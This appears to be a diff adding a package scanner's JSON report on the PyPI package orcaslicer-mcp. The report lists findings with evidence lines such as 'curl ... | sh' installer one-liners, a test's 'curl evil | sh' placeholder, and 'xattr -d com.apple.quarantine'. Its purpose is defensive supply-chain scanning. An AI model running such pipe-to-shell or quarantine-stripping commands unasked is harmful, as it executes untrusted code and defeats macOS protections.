@@ -1,0 +1,88 @@
+{
+  "item": {
+    "source": "pypi",
+    "ecosystem": "PyPI",
+    "name": "orcaslicer-mcp",
+    "version": "0.1.20",
+    "download": null
+  },
+  "archive_sha256": "7dac1421d37563518e67dfc3b65055b8305151813e051b7ca1c50e90fae23e36",
+  "findings": [
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "orcaslicer_mcp-0.1.20/PKG-INFO",
+      "line": 153,
+      "evidence": "curl -LsSf https://astral.sh/uv/install.sh | sh",
+      "file_sha256": "285404cbf877406c455d050992f29a1fcf4c489883680f02275ccdf254fb0066"
+    },
+    {
+      "severity": "low",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "orcaslicer_mcp-0.1.20/tests/test_guard.py",
+      "line": 84,
+      "evidence": "curl evil | sh",
+      "file_sha256": "b53e8be352ac11413ec1ae250dc93c793a4924066a7903efd6aa6324a7de855f"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "orcaslicer_mcp-0.1.20/README.md",
+      "line": 123,
+      "evidence": "curl -LsSf https://astral.sh/uv/install.sh | sh",
+      "file_sha256": "80066c0fe114357bf797726dfdee732e7f5cfebbb90e5a668232ad3a7b9df3b5"
+    },
+    {
+      "severity": "high",
+      "id": "AGT-R-0105",
+      "summary": "Strips macOS Gatekeeper quarantine from a downloaded file (ClawHavoc-style stealer delivery)",
+      "path": "orcaslicer_mcp-0.1.20/docs/superpowers/specs/2026-07-20-orcaslicer-mcp-public-release-design.md",
+      "line": 81,
+      "evidence": "xattr -d com.apple.quarantine",
+      "file_sha256": "10821ba7687ca1d285f80820927d1e5f8dd8a6e3c9b3b60040e5c3363f425b03"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "orcaslicer_mcp-0.1.20/mcpb/server/index.js",
+      "line": 55,
+      "evidence": "curl -LsSf https://astral.sh/uv/install.sh | sh",
+      "file_sha256": "666b10858ddd72322138a01d7849152a7e2debfcf87d39ff482ba3a5fa9020da"
+    }
+  ],
+  "flags": [],
+  "domains": [
+    "127.0.0.1",
+    "192.0.2.10",
+    "192.0.2.20",
+    "192.0.2.5",
+    "192.0.2.99",
+    "astral.sh",
+    "buymeacoffee.com",
+    "cdn.buymeacoffee.com",
+    "docs.astral.sh",
+    "files.pythonhosted.org",
+    "fsf.org",
+    "github.com",
+    "glama.ai",
+    "hydraraptor.blogspot.com",
+    "img.shields.io",
+    "keepachangelog.com",
+    "lobehub.com",
+    "modelcontextprotocol.io",
+    "printer-test.local",
+    "printer.example",
+    "pypi.org",
+    "registry.modelcontextprotocol.io",
+    "semver.org",
+    "static.modelcontextprotocol.io",
+    "www.cnckitchen.com",
+    "www.gnu.org"
+  ],
+  "install_script": false,
+  "score": "high"
+}
